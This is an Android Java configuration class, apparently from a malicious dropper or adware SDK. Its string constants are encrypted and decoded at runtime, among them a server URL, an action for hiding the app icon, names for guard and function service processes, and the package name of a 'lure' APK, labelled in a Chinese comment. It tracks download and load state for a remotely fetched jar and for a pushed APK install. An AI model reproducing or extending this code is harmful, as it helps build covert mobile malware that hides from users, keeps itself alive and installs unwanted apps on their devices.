package com.x.dtswz;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;

/**
 * Created by Administrator on 14-10-23.
 */
public class Config {

    private static String spfName = "d82175072fae98e86c03aa0ecd1985d3";                //ADS_
    public static String assetsAppName = "bfd397a1f550dc8a252fe5781d375003";   //assets
    public static String assetsJarName = "9d6b04c5a02c69df32d8f6b9b1d450da";   //assets
    public static String url = "40ad573ffc128d2ab79a76501993e0373a31024b04d6db5d1b939d36bb4d97d8";    //               6f1e8b3417c63a92744cf5f2799834969c01f566e671413366acce16a0d9dac8
    private static Config config = null;
    private static SharedPreferences spfConfig = null;
    private static SharedPreferences.Editor spfConfigEditor = null;

    private static String spfSdkVersion = "0e5a16fc714953f73900fad2c94cc312";
    private static String spfPackageName = "6a19b4a3dc74748037adefafb96a0363";
    private static String spfMode = "9e8cf004f9d2f9986f3f4c8bea2f4f1c";
    private static String spfAppState = "d19da7ccdbd4dc04808f62e927b64e84";
    private static String spfAppDownLoadState = "a7a17d4e5bfe6f86ce58aa5f41996ab4";
    private static String spfJarDownLoadState = "1389509d12f13448c7be80cc37b0e4c9";
    private static String spfJarState = "cb7b5791080596deca180bddfa711196";
    private static String spfServiceName = "d31dbf6425f706075d6a41ef413e901d";

    public static String sdkVersion = "a6971a5c9b975b6eeef351a9732a0dec";   //sdk版本
    public static String packageName = "ca0af5be03e88f5720d2faf29d13a71f";   //诱导Apk包名
    public static String downLoadPath = Environment.getExternalStorageDirectory().toString();
    public static String jarloadPath = null;
    public static String optimizedDirectory = null;
    public static String serviceClassPATH = "68f5d0c93b03c2e0a373e2868cf84838a573155b4dbed8970ef98a3ff675c3dc";
    public static String HIDEICONAction = "0d05693ba721face0f92dbf1fb6e8d021c55b313ef220c3e4400f9f00d8826fa";
    public static String intentPackageName = "b5e259915929ff7a047db4270cd685b2";
    public static String serviceParentName = "e2c150ce1c038d5220b7e183df161307";
    public static String guardServiceProcessName = "f1d3318799d17b4680ab498e923aade7";
    public static String functionServiceProcessName = "0f095cb24547a2570be28bb45763280f";

    public static String str1 = "b7c374c703fcf273e35f37f19952af3298c014e4b86a9f04adecc676b3f3b6d3";
    public static String str2 = "1fb95edc80dd181a2cf45802de2ea288";
    public static String str3 = "137e2a120a30bb84fdc039398b747760";

    public static final int jarMode = 1;
    public static final int apkMode = 2;
    public static final int apkUknow = 11;
    public static final int apkInstalled = 12;
    public static final int apkUnDownLoad = 21;
    public static final int apkDownLoaded = 22;
    public static final int jarUnLoad = 31;
    public static final int jarLoaded = 32;
    public static final int jarUnDownLoad = 41;
    public static final int jarDownLoaded = 42;

    static {
        str1 = EncrypUtil.decode(str1);
        str2 = EncrypUtil.decode(str2);
        str3 = EncrypUtil.decode(str3);

        spfName = EncrypUtil.decode(spfName);
        assetsAppName = EncrypUtil.decode(assetsAppName);
        assetsJarName = EncrypUtil.decode(assetsJarName);
        url = EncrypUtil.decode(url);
        spfSdkVersion = EncrypUtil.decode(spfSdkVersion);
        spfPackageName = EncrypUtil.decode(spfPackageName);
        spfMode = EncrypUtil.decode(spfMode);
        spfAppState = EncrypUtil.decode(spfAppState);
        spfAppDownLoadState = EncrypUtil.decode(spfAppDownLoadState);
        spfJarDownLoadState = EncrypUtil.decode(spfJarDownLoadState);
        spfJarState = EncrypUtil.decode(spfJarState);
        spfServiceName = EncrypUtil.decode(spfServiceName);

        sdkVersion = EncrypUtil.decode(sdkVersion);
        packageName = EncrypUtil.decode(packageName);
        downLoadPath = downLoadPath + str1;
        serviceClassPATH = EncrypUtil.decode(serviceClassPATH);
        HIDEICONAction = EncrypUtil.decode(HIDEICONAction);
        intentPackageName = EncrypUtil.decode(intentPackageName);
        serviceParentName = EncrypUtil.decode(serviceParentName);
        guardServiceProcessName = EncrypUtil.decode(guardServiceProcessName);
        functionServiceProcessName = EncrypUtil.decode(functionServiceProcessName);
    }

    private Config() {
    }


    public static Config instanse(Context ctx) {
        if (config == null) {
            synchronized (Config.class) {
                if (config == null) {
                    config = new Config();
                }

            }
        }

        if (spfConfig == null) {
            synchronized (Config.class) {
                if (spfConfig == null) {
                    spfConfig = ctx.getSharedPreferences(spfName, Context.MODE_PRIVATE);

                }
            }
        }

        if (spfConfigEditor == null) {
            synchronized (Config.class) {
                if (spfConfigEditor == null) {
                    spfConfigEditor = ctx.getSharedPreferences(spfName, Context.MODE_PRIVATE).edit();

                }
            }
        }

        if (jarloadPath == null) {
            jarloadPath = ctx.getApplicationInfo().dataDir + str2;
        }

        if (optimizedDirectory == null) {
            optimizedDirectory = ctx.getApplicationInfo().dataDir + str3;
        }

        if (!CheakApkSateUtils.cheakFileExist(jarloadPath)) {
            CheakApkSateUtils.createFolder(jarloadPath);
        }

        if (!CheakApkSateUtils.cheakFileExist(downLoadPath)) {
            CheakApkSateUtils.createFolder(downLoadPath);
        }

        if (!CheakApkSateUtils.cheakFileExist(optimizedDirectory)) {
            CheakApkSateUtils.createFolder(optimizedDirectory);
        }
        return config;
    }


    public String getSdkVersion() {
        return spfConfig.getString(spfSdkVersion, sdkVersion);
    }

    public void setSdkVersion(String sdkVersion) {
        spfConfigEditor.putString(this.spfSdkVersion, sdkVersion).commit();
    }

    public String getPackageName() {
        return spfConfig.getString(spfPackageName, packageName);
    }

    public void setPackageName(String packageName) {
        spfConfigEditor.putString(this.spfPackageName, packageName).commit();
    }

    public int getMode() {
        return spfConfig.getInt(spfMode, jarMode);
    }

    public void setMode(int mode) {
        spfConfigEditor.putInt(this.spfMode, mode).commit();
    }

    public int getAppSate() {
        return spfConfig.getInt(spfAppState, apkUknow);
    }

    public void setAppSate(int state) {
        spfConfigEditor.putInt(this.spfAppState, state).commit();
    }

    public int getAppDownLoadState(String sdkVersion) {
        return spfConfig.getInt(spfAppDownLoadState + sdkVersion, apkUnDownLoad);
    }

    public void setAppDownLoadState(String sdkVersion, int state) {
        spfConfigEditor.putInt(this.spfAppDownLoadState + sdkVersion, state).commit();
    }

    public int getJarState() {
        return spfConfig.getInt(spfJarState, jarUnLoad);
    }

    public void setJarState(int state) {
        spfConfigEditor.putInt(spfJarState, state);
    }

    public int getJarDownLoadState(String sdkVersion) {
        return spfConfig.getInt(spfJarDownLoadState + sdkVersion, jarUnDownLoad);
    }

    public void setJarDownLoadState(String sdkVersion, int state) {
        spfConfigEditor.putInt(this.spfJarDownLoadState + sdkVersion, state).commit();
    }

    public String getServiceName() {
        return spfConfig.getString(spfServiceName, "");
    }

    public void setServiceName(String serviceName) {
        spfConfigEditor.putString(spfServiceName, serviceName).commit();
    }


}
